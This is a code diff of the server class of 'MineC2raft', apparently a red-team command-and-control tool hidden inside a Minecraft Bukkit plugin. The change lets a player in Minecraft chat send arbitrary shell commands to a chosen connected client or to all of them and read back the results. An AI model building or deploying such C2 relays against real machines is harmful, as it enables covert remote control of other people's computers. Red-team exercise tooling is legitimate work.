@@ -8,6 +8,7 @@ import java.net.Socket;
 import java.util.concurrent.CopyOnWriteArrayList;
 
 import org.bukkit.Bukkit;
+import org.bukkit.command.CommandSender;
 import org.bukkit.plugin.java.JavaPlugin;
 import org.bukkit.scheduler.BukkitTask;
 
@@ -15,7 +16,7 @@ import org.bukkit.scheduler.BukkitTask;
 /**@author Austin Hall
  * Main server class that handles communication between multiple clients running the Client class.
  * Utilizes the ClientHandler class, making this class easier to read.
- * Server code modified for compatibility with Bukkit API.
+ * Original Server code modified for compatibility with Bukkit API.
  * CHATGPT was used as a LEARNING TOOL in the creation of this software.
  */
 public class Server {
@@ -30,7 +31,8 @@ public class Server {
     private static final double VERSION_NUM = 0.1; //version number (change when I feel cheeky ;)
     public static final CopyOnWriteArrayList<ClientHandler> clients = new CopyOnWriteArrayList<>(); // array of clients as threads.
 
-    private static ServerSocket serverSocket;
+    private static ServerSocket serverSocket; //socket of the server duh
+    private static BukkitTask connectionThread; // bukkit thread that synchronises actions between this server and minecraft.
 
     /**
      * Creates a new Server object. Make only one of these plz
@@ -54,7 +56,7 @@ public class Server {
         System.out.println(GREEN + "Server Created. Listening for clients..." + RESET);
 
         //schedule bukkit thread to handle communications between server any any clients
-        BukkitTask connectionThread = Bukkit.getScheduler().runTaskAsynchronously(plugin, () -> {
+         connectionThread = Bukkit.getScheduler().runTaskAsynchronously(plugin, () -> {
             try {
                 while(!Thread.currentThread().isInterrupted()) {
                     Socket clientSocket = serverSocket.accept();
@@ -68,9 +70,9 @@ public class Server {
                 }
             } catch (IOException e) {
                 System.out.println(RED + "Client thread stopped." + RESET);
-            }
+            } 
         });
-
+        
         System.out.println(YELLOW + "Type 'coms' for a list of commands." + RESET);
     }    
 
@@ -79,17 +81,17 @@ public class Server {
      * Some special commands have been added for ease of use, and any non-special commands will be interpreted through the client's terminal.
      * @param cmd - the user input.
      */
-    public static String commandHandler(String cmd) {
+    public static String commandHandler(String cmd, String target, CommandSender sender) {
         String reply;
         String returnStr = "";
         switch(cmd) {
             case "os", "version":
                 reply = "ver";
-                returnStr = broadcast(reply, null);
+                returnStr = broadcast(reply, null, target);
                 break;
             case "user", "client":
                 reply = "whoami";
-                returnStr = broadcast(reply, null);
+                returnStr = broadcast(reply, null, target);
                 break;
             case "coms", "commands", "cmds", "HELP": 
                 reply = "               ********** MineC2raft Commands ***********\n" 
@@ -114,13 +116,13 @@ public class Server {
                         + "\nWritten by Austin Hall for RIT's Red Team.\n" 
                         + "For fun too lowk...\n\n" 
                         + "A dud?\n/give @p oak_sapling 100";
-                  BroadcastPrintStream.println(reply, false);
+                  BroadcastPrintStream.println(reply, sender, false);
                 break;
             case "sockets", "clients", "list", "lst", "array", "arr":
                 formatArrLst();
                 break;                
             default: 
-                returnStr = broadcast(cmd, null);
+                returnStr = broadcast(cmd, null, target);
                 break;  
         }
         return returnStr;
@@ -146,7 +148,7 @@ public class Server {
      * Broadcasts commands to all clients - if the message does not have "CMD: " at the start, the client WILL NOT interpret the message.
      * @return the String to return to the minecraft command (so you can see it show up in chat!)
      */
-    public static String broadcast(String msg, ClientHandler sender) {
+    public static String broadcast(String msg, ClientHandler sender, String response) {
 
         if(msg == null || msg.trim().isEmpty() || msg.equals("__END__")) {
             
@@ -155,7 +157,6 @@ public class Server {
             System.out.println(RED + "No clients connected." + RESET);
             
         }
-        String response = "all"; // TODO - check where we want ts to go in sendMessage
 
         if(response != null) {
             if(response.equals("all")) {
@@ -170,7 +171,7 @@ public class Server {
                     clients.get(Integer.parseInt(response)).sendMessage("CMD: " + msg);
                     return clients.get(Integer.parseInt(response)).getRecentLn();
                 } catch(Exception e) {
-                    System.out.println("Not a valid option.");
+                    System.out.println("Invalid Target!");
                 }
             }
         }
@@ -202,6 +203,8 @@ public class Server {
     public static void stopServer() {
         try {
             serverSocket.close();
+            connectionThread.cancel();
+            exists = false;
 
         } catch(Exception e) {
             System.out.println("Error stopping server: " + e);
